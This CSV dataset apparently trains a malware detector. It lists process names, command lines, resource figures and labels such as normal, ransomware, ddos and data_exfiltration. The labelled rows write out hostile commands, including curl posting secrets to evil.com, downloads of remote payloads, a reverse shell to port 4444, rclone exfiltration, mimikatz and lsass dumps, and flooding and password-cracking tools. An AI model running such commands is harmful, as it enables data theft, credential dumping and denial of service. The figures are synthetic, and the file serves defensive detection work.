process_name,cmdline,cpu_usage,memory_usage,pid,ppid,has_network_activity,connection_count,is_system_user,label
helper.exe,helper.exe --reverse-shell 10.0.0.1:4444,10.869511321794798,25.033975904296888,21237,5005,1,0,0,trojan
Discord.exe,Discord.exe,20.1787425045782,3.5156583642315864,54634,8337,0,13,0,normal
npm.exe,npm.exe,7.53066954966235,9.0595440693959,19045,6160,0,0,1,normal
cmd.exe,cmd.exe,24.8702586609729,2.541274799919681,25963,470,0,0,1,normal
MsMpEng.exe,MsMpEng.exe,50.68848881694548,4.955196981650783,12525,7606,1,4,1,normal
chrome_update.exe,chrome_update.exe --no-ui,22.15497076443325,29.67214698130535,20655,1190,0,3,0,trojan
bash.exe,bash.exe,51.670127790617265,1.222100319675016,57300,3465,0,7,0,normal
csrss.exe,csrss.exe,0.669406647714584,0.16463617695913085,46513,1560,0,15,1,normal
locker.exe,locker.exe --wallet bc1qxy...,63.44441315577712,29.99025123830284,17939,2098,1,20,0,ransomware
python3.exe,python3.exe,33.80239720372082,18.088956820386286,16836,2498,0,10,1,normal
devenv.exe,devenv.exe,39.42681948577602,7.558378296900356,24029,3778,1,1,1,normal
powershell.exe,powershell.exe,8.492651526009308,8.890088888150547,61158,7357,0,3,1,normal
hping.exe,hping.exe --flood -p 80 target.com,90.17655206606867,20.656638003007508,38044,5078,1,4850,0,ddos
mimikatz.exe,mimikatz.exe lsadump::sam,43.99949186334404,17.906696054120793,4348,4961,0,18,0,malware
update.exe,update.exe --silent --download http://evil.com/payload,27.91065862298978,28.403839887788152,46815,8328,0,18,0,trojan
curl.exe,curl.exe -X POST -d @secrets.txt http://evil.com,6.874439326792027,26.040630367696675,17354,6043,1,13,0,data_exfiltration
msedge.exe,msedge.exe,41.5804151131206,20.77838427814252,22548,7335,0,2,0,normal
services.exe,services.exe,1.9452663967489958,0.8846756886084709,45683,891,0,11,0,normal
firefox.exe,firefox.exe,14.430629947831415,11.159342693339157,28555,3542,0,6,0,normal
Teams.exe,Teams.exe,15.115828912992995,7.620476520019876,27252,9564,1,12,1,normal
encrypt.exe,encrypt.exe --recursive C:\Users,62.413338356697274,24.34545219491501,64305,7648,0,8,0,ransomware
stress.exe,stress.exe --cpu 16 --flood,99.1183216033364,28.21533720054731,32717,3102,1,205,0,ddos
cmd.exe,cmd.exe,20.549515265906077,0.18129194389984937,38880,9163,0,4,1,normal
lsass.exe,lsass.exe,2.982553873663332,0.6383926021708324,58195,4582,0,6,1,normal
System Idle Process,System Idle Process,83.93750305528093,0.06347744953730858,63716,3555,1,12,0,normal
dwm.exe,dwm.exe,14.670777775151105,2.3140942626877417,52441,1332,0,13,0,normal
devenv.exe,devenv.exe,65.3982447655018,13.27394705070472,25976,9640,0,9,0,normal
encrypt.exe,encrypt.exe --recursive C:\Users,76.10631920233345,23.554089331626866,31227,9031,1,17,0,ransomware
Docker Desktop.exe,Docker Desktop.exe,28.66349012593053,2.5219824756840836,62680,1513,1,14,0,normal
explorer.exe,explorer.exe,9.945528482986303,4.83364299936253,48883,7347,0,3,0,normal
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,98.97058620880387,17.5431461470682,28281,1599,1,8,0,brute_force
csrss.exe,csrss.exe,0.12392781593091795,0.35316725673455585,15625,3499,0,14,0,normal
stress.exe,stress.exe --cpu 16 --flood,93.17029153236135,16.054747806407597,31009,3646,1,742,0,ddos
Docker Desktop.exe,Docker Desktop.exe,2.2445180521357244,9.237970403565466,59396,2756,0,0,0,normal
hashcat.exe,hashcat.exe -m 1000 hash.txt wordlist.txt,91.725458940515,19.73583518113112,5631,7752,0,16,0,brute_force
Slack.exe,Slack.exe,12.722696704754608,4.935725991469724,55108,8850,1,5,0,normal
explorer.exe,explorer.exe,1.1341236030192603,2.8187246443459966,3871,2063,1,15,0,normal
MSBuild.exe,MSBuild.exe,5.438905511628789,14.21133291365908,13657,7123,1,0,1,normal
SearchIndexer.exe,SearchIndexer.exe,21.197092776837213,3.643129090858807,30709,3986,0,5,0,normal
svchosts.exe,svchosts.exe -connect evil.com,23.174927963442236,29.29747746296343,54898,3949,0,0,0,malware
docker.exe,docker.exe,27.465434604971193,8.203995259985994,3649,6264,0,0,1,normal
helper.exe,helper.exe --reverse-shell 10.0.0.1:4444,20.14263360289867,15.228929151174201,5338,7142,0,1,0,trojan
MsMpEng.exe,MsMpEng.exe,49.57168081410507,2.298452506805999,12646,3885,0,5,1,normal
firefox.exe,firefox.exe,18.613733013968005,7.990344404941759,37632,9578,0,3,0,normal
docker.exe,docker.exe,30.251906480625973,5.837736966755163,5574,8299,1,6,0,normal
SearchIndexer.exe,SearchIndexer.exe,29.968989140965295,3.1173379819668114,21826,7783,0,1,0,normal
WindowsTerminal.exe,WindowsTerminal.exe,11.436717095069909,2.584108637210335,3358,752,1,4,0,normal
csrss.exe,csrss.exe,0.6863575466976178,0.6095866654221549,30767,3613,1,1,1,normal
System Idle Process,System Idle Process,87.93674797084297,0.02586857574130076,3891,7786,0,12,0,normal
Slack.exe,Slack.exe,7.8401681068930165,8.327333195066835,57053,5002,0,5,0,normal
wsl.exe,wsl.exe,32.1149599553845,5.6301333960904625,41812,7500,0,5,0,normal
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,88.70444694805909,5.675723326817973,31200,4678,0,13,0,brute_force
devenv.exe,devenv.exe,49.44553452038575,18.531020213674196,52483,6150,0,14,0,normal
winpeas.exe,winpeas.exe,50.207132187508165,6.735822508058984,50986,586,1,3,0,privilege_escalation
docker.exe,docker.exe,49.84577579594556,2.800149248797992,62010,8484,1,12,0,normal
python3.exe,python3.exe,53.83061442773749,13.872770880963897,5998,6778,1,10,0,normal
lsass.exe,lsass.exe,4.541974909061079,1.3597289494513476,4443,8845,1,2,1,normal
bash.exe,bash.exe,31.472030006877308,1.4732600245886383,23773,8413,1,0,0,normal
Code.exe,Code.exe,11.974781893571617,2.944191268259532,1530,6505,0,10,0,normal
OUTLOOK.EXE,OUTLOOK.EXE,21.298951399512084,5.086450986735813,18070,5929,0,9,1,normal
stress.exe,stress.exe --cpu 16 --flood,95.46655990861508,20.588886747608747,29514,53,1,386,0,ddos
chrome.exe,chrome.exe,21.06105583626007,21.173884120016414,51649,8819,0,12,0,normal
tsc.exe,tsc.exe,96.66781123693238,3.996168413795523,62462,9973,0,12,0,normal
python.exe,python.exe,88.13410460836104,1.9826253125763103,52420,2725,0,6,1,normal
python.exe,python.exe,87.50866074770565,28.65320686727248,33037,7547,0,0,0,normal
scvhost.exe,scvhost.exe,11.209595961700064,10.013511419109438,20911,7745,1,15,0,malware
MSBuild.exe,MSBuild.exe,35.333713956007884,6.647587888738295,51744,6409,1,6,0,normal
services.exe,services.exe,1.7361397984729545,0.3609543205929946,37723,913,0,5,0,normal
MSBuild.exe,MSBuild.exe,87.39765893289143,17.18727448443737,48539,4286,1,7,0,normal
scvhost.exe,scvhost.exe,31.635670364119147,20.658783287809506,12260,3219,1,1,0,malware
procdump.exe,procdump.exe -ma lsass.exe lsass.dmp,58.11138736437202,7.399532087006231,55232,5949,1,18,0,privilege_escalation
webpack.exe,webpack.exe,45.40278593132193,2.430618978544368,40468,6582,0,3,1,normal
explorer.exe,explorer.exe,6.8972804729246695,1.2859886035520742,323,2159,1,6,0,normal
loic.exe,loic.exe --target 192.168.1.1,70.2118439639959,12.731703731645752,42337,6164,1,886,0,ddos
ransom.exe,ransom.exe --encrypt --payment,77.392375386746,28.833019120518735,34340,2138,1,18,0,ransomware
helper.exe,helper.exe --reverse-shell 10.0.0.1:4444,19.66401660560212,22.73132308831197,18050,5795,1,18,0,trojan
tsc.exe,tsc.exe,49.17738933084568,4.696489304867085,10448,1353,0,1,0,normal
update.exe,update.exe --silent --download http://evil.com/payload,12.138229060489587,21.729130379607433,50805,8906,0,12,0,trojan
locker.exe,locker.exe --wallet bc1qxy...,65.23962570325881,9.958249402238025,6256,5527,1,20,0,ransomware
MsMpEng.exe,MsMpEng.exe,75.25035545110973,5.493132034786958,37551,1155,0,3,0,normal
payload.exe,payload.exe --silent,76.1517302547287,11.418135356034638,48014,4118,1,10,0,malware
stress.exe,stress.exe --cpu 16 --flood,90.0762114528927,20.64981877603708,58991,953,1,560,0,ddos
loic.exe,loic.exe --target 192.168.1.1,70.35192120670861,24.188673692179393,31828,808,1,795,0,ddos
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,29.08314605549913,27.380125926852223,12048,3254,1,14,0,data_exfiltration
explorer.exe,explorer.exe,8.374349991771382,3.950319649819571,16665,3438,0,14,0,normal
hping.exe,hping.exe --flood -p 80 target.com,87.54668382499196,25.2170918177813,11341,7009,1,3431,0,ddos
webpack.exe,webpack.exe,40.70551810152464,17.512319192101238,24792,1568,0,0,1,normal
medusa.exe,medusa.exe -h 10.0.0.1 -u admin -P passwords.txt,35.25011703364816,24.980741168819808,17573,1595,0,20,0,brute_force
Slack.exe,Slack.exe,22.102174149415436,2.4198096006635286,30120,7265,1,0,0,normal
stress.exe,stress.exe --cpu 16 --flood,97.4076442246738,24.517186788085574,54653,2204,1,478,0,ddos
hping.exe,hping.exe --flood -p 80 target.com,89.92533467431353,10.570791177957204,56830,8353,1,4172,0,ddos
git.exe,git.exe,22.92610008849014,4.916694253828769,52367,9940,0,7,1,normal
npm.exe,npm.exe,52.83314244118502,15.686500958100313,34893,3186,0,3,1,normal
firefox.exe,firefox.exe,10.380588817523062,9.81156912615911,22530,4650,0,8,1,normal
ransom.exe,ransom.exe --encrypt --payment,79.29943989508304,23.303768296639543,43050,1262,0,16,0,ransomware
msedge.exe,msedge.exe,9.976273463485297,23.466750869343116,62900,227,0,3,0,normal
System Idle Process,System Idle Process,82.70020899854983,0.04341861808953332,25307,8116,0,1,0,normal
Docker Desktop.exe,Docker Desktop.exe,4.975758424247343,2.806152241876298,7111,7627,0,7,0,normal
svchosts.exe,svchosts.exe -connect evil.com,25.40088263919563,12.106042680705352,32022,5762,0,8,0,malware
mimikatz.exe,mimikatz.exe lsadump::sam,20.03956517003468,15.488360578367248,31645,4897,0,12,0,malware
Docker Desktop.exe,Docker Desktop.exe,31.10955088190416,2.5558812415698253,45334,7643,0,1,0,normal
explorer.exe,explorer.exe,0.3689647888056957,2.3103554828190673,49673,2753,1,10,0,normal
python.exe,python.exe,66.78983139719385,19.33911962764722,21743,4790,0,2,1,normal
java.exe,java.exe,60.60141060109011,25.769932688280065,32397,5660,1,12,0,normal
python.exe,python.exe,1.991805403177338,15.530271376821672,27516,5245,0,1,0,normal
python.exe,python.exe,16.336305056881983,10.19180647102528,53509,5223,1,4,0,normal
psexec.exe,psexec.exe \\target -s cmd.exe,37.979642016820776,25.53234097508032,3780,8871,0,14,0,privilege_escalation
csrss.exe,csrss.exe,2.835405471982876,0.6457886174828935,27731,7985,0,12,1,normal
firefox.exe,firefox.exe,57.50792692501301,7.126696975909021,44323,1912,0,9,0,normal
loic.exe,loic.exe --target 192.168.1.1,92.33367084457154,29.537126553746386,31411,5505,1,537,0,ddos
curl.exe,curl.exe -X POST -d @secrets.txt http://evil.com,13.890651635744028,18.04393236454745,52847,7203,0,4,0,data_exfiltration
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,59.0185480742816,26.21112365119503,28766,8522,1,4,0,data_exfiltration
dwm.exe,dwm.exe,15.273734403344609,4.559412376497804,52546,4375,1,15,0,normal
Docker Desktop.exe,Docker Desktop.exe,24.957705170901203,10.308606717326349,56445,5177,0,12,0,normal
firefox.exe,firefox.exe,8.521901599101245,4.603583225499256,11558,6200,0,2,0,normal
java.exe,java.exe,25.28815819018454,9.934640158761432,9723,7247,0,12,1,normal
Code.exe,Code.exe,43.46754907839782,6.6597754106633165,18638,8760,1,10,1,normal
dwm.exe,dwm.exe,19.839751016606037,7.661624383702968,42575,3835,0,7,0,normal
svchost.exe,svchost.exe -connect 185.141.62.123:443,17.112754932590207,23.931808522177356,42662,2457,1,4,0,trojan
svchost.exe,svchost.exe,5.0116084544255015,1.6214585174467544,45807,6025,1,12,0,normal
ftp.exe,ftp.exe -s:script.txt evil-server.com,11.211737226917855,27.682226640489496,12184,2209,0,1,0,data_exfiltration
wsl.exe,wsl.exe,11.634606473814497,4.57390101486749,26742,6762,0,13,0,normal
Discord.exe,Discord.exe,8.871687140672723,12.281347123368088,37255,5334,0,0,0,normal
cryptor.exe,cryptor.exe -aes256 -all,83.20857368947944,25.62993121351363,33296,4680,1,6,0,ransomware
System Idle Process,System Idle Process,89.29412515172623,0.0239221720726857,52939,6875,0,0,0,normal
chrome.exe,chrome.exe,46.47648455120047,16.0493976589508,22265,2702,1,12,0,normal
psexec.exe,psexec.exe \\target -s cmd.exe,13.347899443666801,14.255432667831892,5772,7732,0,19,0,privilege_escalation
MsMpEng.exe,MsMpEng.exe,14.451219821555181,7.352105902075053,550,522,1,11,0,normal
devenv.exe,devenv.exe,1.9128288437643892,9.330429583273212,51911,2864,0,15,0,normal
System,System,4.699563661872944,0.42395375220805237,3601,2716,1,15,1,normal
chrome.exe,chrome.exe,52.69297385216298,25.428588910228537,17513,1915,0,15,0,normal
Code.exe,Code.exe,6.954418460828276,2.191395300902739,8970,834,0,11,1,normal
Teams.exe,Teams.exe,18.72267913785831,16.21218617214231,39396,9149,0,10,0,normal
csrss.exe,csrss.exe,2.9951284326915255,0.5102917765711052,30240,8402,0,12,1,normal
git.exe,git.exe,43.97993151729803,4.395876049664919,55025,1381,1,0,0,normal
Discord.exe,Discord.exe,10.183618084531457,10.040911402230195,35768,6934,1,11,1,normal
node.exe,node.exe,79.07783224618524,14.136469729284682,13120,2378,0,14,0,normal
tsc.exe,tsc.exe,72.63169471416477,8.019822600644147,15135,891,0,2,1,normal
webpack.exe,webpack.exe,25.77024152489622,12.074592697561519,56030,508,0,5,0,normal
npm.exe,npm.exe,96.76358050187626,15.89875780831682,43395,8838,1,5,0,normal
docker.exe,docker.exe,46.773061476845854,4.496956222461036,45942,3215,0,15,0,normal
loic.exe,loic.exe --target 192.168.1.1,90.27842558046036,9.405176316541894,13083,9613,1,1144,0,ddos
powershell.exe,powershell.exe,58.47792082273277,5.54306457623249,29581,8120,1,15,0,normal
stress.exe,stress.exe --cpu 16 --flood,94.61546363356831,8.57369601528702,50893,6829,1,786,0,ddos
hping.exe,hping.exe --flood -p 80 target.com,99.21240723799414,7.7138089537104175,22012,963,1,3933,0,ddos
devenv.exe,devenv.exe,36.26886626674368,13.638573269832193,18545,9863,0,1,0,normal
psexec.exe,psexec.exe \\target -s cmd.exe,35.85516692059589,15.445478218600329,45348,259,0,13,0,privilege_escalation
WindowsTerminal.exe,WindowsTerminal.exe,21.533001541720402,6.439167040632372,13714,1810,0,7,1,normal
npm.exe,npm.exe,66.63001300446588,9.043047323529544,13437,8890,0,6,0,normal
System Idle Process,System Idle Process,83.68865744946744,0.03525352007202664,11237,5502,0,15,1,normal
hping.exe,hping.exe --flood -p 80 target.com,82.58599868263023,20.077490253446523,35021,7086,1,696,0,ddos
SearchIndexer.exe,SearchIndexer.exe,3.0730313656668615,4.817146675666505,28031,6172,0,2,0,normal
OUTLOOK.EXE,OUTLOOK.EXE,23.156155568888536,3.12954346089564,57101,5962,0,0,0,normal
bash.exe,bash.exe,47.70940509167845,4.7205156219811215,31447,3975,0,5,0,normal
MsMpEng.exe,MsMpEng.exe,3.243973176006083,9.158579019138838,58286,4934,0,8,0,normal
OUTLOOK.EXE,OUTLOOK.EXE,27.80400385808831,5.779507676989515,60163,7825,0,9,1,normal
MsMpEng.exe,MsMpEng.exe,37.336748363353,4.08548869200857,29264,968,0,13,1,normal
wsl.exe,wsl.exe,8.187605107539364,8.696360738469423,23183,9900,0,2,0,normal
Teams.exe,Teams.exe,11.678240785061254,4.9265853168651095,13267,4236,1,6,0,normal
explorer.exe,explorer.exe,4.373426070718165,1.8704461577834732,58671,8364,0,7,0,normal
npm.exe,npm.exe,73.82630975757148,6.023606483617693,47204,8123,0,4,1,normal
node.exe,node.exe,64.27785723851966,2.4144023124992735,29441,8437,0,15,1,normal
Slack.exe,Slack.exe,8.277445989966187,6.788002715984803,10644,7463,0,11,1,normal
npm.exe,npm.exe,86.8090408798234,1.538674431867554,27699,8137,1,4,0,normal
svchost.exe,svchost.exe,5.003572222951643,2.2225855746927428,44270,9766,0,7,0,normal
services.exe,services.exe,1.9425476794953371,0.7850122896860926,3283,8998,0,14,1,normal
git.exe,git.exe,28.559395472467187,0.574482521446463,54053,2178,0,15,1,normal
Docker Desktop.exe,Docker Desktop.exe,27.193810075201856,7.173321778551973,41297,7465,0,10,1,normal
encrypt.exe,encrypt.exe --recursive C:\Users,63.309351626620824,18.948891148338333,29908,8778,0,20,0,ransomware
chrome.exe,chrome.exe,50.02054745101934,10.530939340861096,27170,159,0,6,1,normal
loic.exe,loic.exe --target 192.168.1.1,82.53138428779236,17.195279322375374,50459,6385,1,1146,0,ddos
csrss.exe,csrss.exe,2.326212742356521,0.6842011778848904,52249,388,0,5,1,normal
docker.exe,docker.exe,9.108992620896206,3.131860472959509,39280,8507,0,15,1,normal
npm.exe,npm.exe,83.57318967077583,7.515618666911375,19920,3809,0,3,0,normal
winpeas.exe,winpeas.exe,31.289829373580176,27.452609159621353,37870,7068,1,3,0,privilege_escalation
python.exe,python.exe,75.51830462130307,23.16261497517697,7110,2058,1,12,0,normal
firefox.exe,firefox.exe,37.66525879184867,9.833895259009173,35981,9463,0,4,0,normal
lsass.exe,lsass.exe,4.150246501853321,0.4624931333138521,37524,7135,0,8,0,normal
svchost.exe,svchost.exe -connect 185.141.62.123:443,25.349357619153782,17.659684556980544,31048,1459,1,15,0,trojan
webpack.exe,webpack.exe,61.72044609576744,6.217440032870073,49762,4252,0,5,0,normal
python.exe,python.exe,54.923752559796434,24.903311646787312,50982,3443,0,6,1,normal
System,System,4.909353334383844,0.045766088454318676,2678,4723,1,8,0,normal
update.exe,update.exe --silent --download http://evil.com/payload,33.5711560070709,15.229589713500548,44572,6067,0,6,0,trojan
explorer.exe,explorer.exe,6.644835463461437,2.3078319349738647,14706,4097,0,10,1,normal
stress.exe,stress.exe --cpu 16 --flood,94.76163931259853,6.545623099722857,15868,2083,1,869,0,ddos
SearchIndexer.exe,SearchIndexer.exe,27.5725597144207,1.661418132615328,63945,3767,0,5,0,normal
dwm.exe,dwm.exe,1.197890647639241,7.040700279002543,31918,795,1,0,0,normal
msedge.exe,msedge.exe,43.37179648451257,9.655974129881713,18014,4295,0,10,1,normal
Code.exe,Code.exe,15.4114497455073,7.660922900127661,41104,6572,0,8,1,normal
python3.exe,python3.exe,20.103551587368308,13.935135734334768,37383,352,0,9,0,normal
firefox.exe,firefox.exe,26.645417950496707,9.939569251625368,38088,5798,1,6,1,normal
explorer.exe,explorer.exe,1.8108575475924304,2.7986552986342543,9869,6072,1,3,1,normal
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,93.28729174733886,22.586411709283112,47024,3565,1,3,0,brute_force
docker.exe,docker.exe,40.33103362807426,1.0589025171534099,15234,9491,1,6,0,normal
juicypotato.exe,juicypotato.exe -l 1337 -p cmd.exe,20.1544931336259,20.874956919492327,45750,6976,1,13,0,privilege_escalation
webpack.exe,webpack.exe,96.05087422273958,2.97870372107837,8520,6929,0,4,0,normal
medusa.exe,medusa.exe -h 10.0.0.1 -u admin -P passwords.txt,59.215516786917824,22.71888852647972,12239,9994,1,2,0,brute_force
java.exe,java.exe,79.76711404822947,16.45824189423302,59988,9651,0,8,0,normal
powershell.exe,powershell.exe,32.02163694631251,7.798947120994004,14761,4577,0,12,0,normal
loic.exe,loic.exe --target 192.168.1.1,74.61682145048705,20.99685441579059,6873,6313,1,808,0,ddos
hashcat.exe,hashcat.exe -m 1000 hash.txt wordlist.txt,94.6197643963852,19.9393032987455,31504,896,1,2,0,brute_force
webpack.exe,webpack.exe,50.67432825967265,10.335515347844156,1638,4332,1,12,0,normal
cryptor.exe,cryptor.exe -aes256 -all,97.50571030932034,6.842837299427128,56183,5412,0,6,0,ransomware
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,55.229545662183334,6.083520020570683,62931,3976,1,8,0,data_exfiltration
node.exe,node.exe,31.355714284656845,12.299302318938732,31539,7345,0,8,0,normal
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,47.880757674966674,10.864274677078548,12594,2748,0,14,0,data_exfiltration
svchost.exe,svchost.exe,14.477753279602386,2.125971250017184,25997,3042,0,8,1,normal
curl.exe,curl.exe -X POST -d @secrets.txt http://evil.com,14.535525901051184,19.907299275014516,13898,7486,1,10,0,data_exfiltration
Discord.exe,Discord.exe,2.0493375669682736,12.058045980310375,57937,1789,0,11,0,normal
stress.exe,stress.exe --cpu 16 --flood,97.11569943181883,12.574993608752173,57751,6816,1,775,0,ddos
ransom.exe,ransom.exe --encrypt --payment,66.52243989818379,26.77199940530499,15837,2644,0,12,0,ransomware
svchosts.exe,svchosts.exe -connect evil.com,33.56011335532426,7.919546543444526,53408,4620,0,15,0,malware
chrome.exe,chrome.exe,36.44260097694911,10.076644658986972,9432,9492,0,2,1,normal
WindowsTerminal.exe,WindowsTerminal.exe,15.29333182549211,4.149837125565202,30523,2933,0,5,1,normal
SearchIndexer.exe,SearchIndexer.exe,7.541643170229657,2.3528939839466148,36601,3483,0,2,0,normal
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,42.46614375285965,6.871528955649737,5002,4680,0,15,0,data_exfiltration
winpeas.exe,winpeas.exe,40.13068406310142,24.134856109128943,58142,8191,1,20,0,privilege_escalation
Teams.exe,Teams.exe,11.33431926458789,19.348161683347676,48963,8257,1,8,0,normal
OUTLOOK.EXE,OUTLOOK.EXE,28.605313343393348,13.287684079529395,21785,5505,0,11,0,normal
services.exe,services.exe,0.3261112669028008,0.34377070951150734,24933,3064,0,13,0,normal
loic.exe,loic.exe --target 192.168.1.1,73.6012010111747,19.19384767777632,47323,3287,1,422,0,ddos
Code.exe,Code.exe,46.85470881831848,9.450565905189238,22392,442,0,12,0,normal
python.exe,python.exe,69.44444038940952,27.251214911778256,6222,3404,0,13,0,normal
MsMpEng.exe,MsMpEng.exe,2.7479161069870894,4.660738452253151,58774,6596,0,11,0,normal
encrypt.exe,encrypt.exe --recursive C:\Users,70.15400388545619,29.205189394337832,40115,7630,0,1,0,ransomware
payload.exe,payload.exe --silent,25.05422338017404,26.06157636961005,31216,8474,1,19,0,malware
procdump.exe,procdump.exe -ma lsass.exe lsass.dmp,41.49875355602973,12.041921633531459,28865,1238,0,20,0,privilege_escalation
cmd.exe,cmd.exe,13.018964095340014,1.3484484984503355,14522,2660,0,4,1,normal
hping.exe,hping.exe --flood -p 80 target.com,99.58776154429955,15.430934548182902,7585,409,1,804,0,ddos
Teams.exe,Teams.exe,8.443167066497844,18.284309041064354,655,2064,0,6,1,normal
devenv.exe,devenv.exe,0.6586724395756893,23.70013050120933,17686,2458,0,15,0,normal
WindowsTerminal.exe,WindowsTerminal.exe,11.173851254505292,6.347591459205082,59084,7684,0,7,0,normal
loic.exe,loic.exe --target 192.168.1.1,74.87078583106499,22.517112548968385,59065,7390,1,1851,0,ddos
java.exe,java.exe,68.49246732158447,8.35523737916592,57224,7610,0,3,0,normal
explorer.exe,explorer.exe,7.959799063269895,4.871814143682944,57757,6633,1,15,0,normal
Docker Desktop.exe,Docker Desktop.exe,33.72529783055412,12.961193705429762,46470,8747,1,9,0,normal
npm.exe,npm.exe,24.481675048761698,5.821234585348954,57452,3159,0,13,0,normal
dwm.exe,dwm.exe,21.235026926151708,2.7714619090863284,24937,5852,1,1,1,normal
MSBuild.exe,MSBuild.exe,26.759906320397743,2.51252507888055,35206,3887,1,12,0,normal
python.exe,python.exe,35.891582862629214,15.722284250931805,58995,6959,0,8,0,normal
wsl.exe,wsl.exe,25.60356171206852,4.967928405376801,17239,3633,1,2,0,normal
stress.exe,stress.exe --cpu 16 --flood,97.89991924848132,13.455432846405603,41486,1262,1,346,0,ddos
MsMpEng.exe,MsMpEng.exe,7.679329356780471,4.579902809521845,10831,6994,0,0,0,normal
dwm.exe,dwm.exe,0.4026457647941656,7.867385807467506,56437,136,0,15,1,normal
tsc.exe,tsc.exe,57.432466145520934,7.636813131095988,38582,4587,1,12,0,normal
MsMpEng.exe,MsMpEng.exe,62.39644872529845,5.882878977807179,38595,82,1,10,1,normal
update.exe,update.exe --silent --download http://evil.com/payload,22.758793038696574,18.46682541995144,28880,2546,0,15,0,trojan
lsass.exe,lsass.exe,1.1164161576128055,0.8067935164748514,56180,5343,0,9,0,normal
cryptor.exe,cryptor.exe -aes256 -all,90.55505134643525,14.869616990768787,1896,7634,1,13,0,ransomware
